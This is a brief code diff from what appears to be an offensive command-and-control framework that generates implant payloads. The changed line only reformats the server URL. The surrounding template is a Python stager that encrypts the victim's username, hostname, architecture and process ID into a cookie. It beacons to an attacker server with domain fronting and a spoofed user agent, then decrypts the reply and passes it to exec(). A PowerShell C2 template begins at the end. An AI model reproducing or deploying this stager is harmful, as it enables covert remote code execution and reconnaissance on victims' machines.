@@ -72,7 +72,7 @@ encsid=encrypt(key, '%%s;%%s;%%s;%%s;%%s;' %% (un,hn,hn,arch,pid))
 if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
 res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\\0');exec(x)
-    """ % (self.KillDate,self.PythonHash,self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport+"/"),(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.DomainFrontHeader,self.UserAgent)
+    """ % (self.KillDate,self.PythonHash,self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport),(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.DomainFrontHeader,self.UserAgent)
     self.C2Core = """%s
 $sc="%s"
 $s="%s"
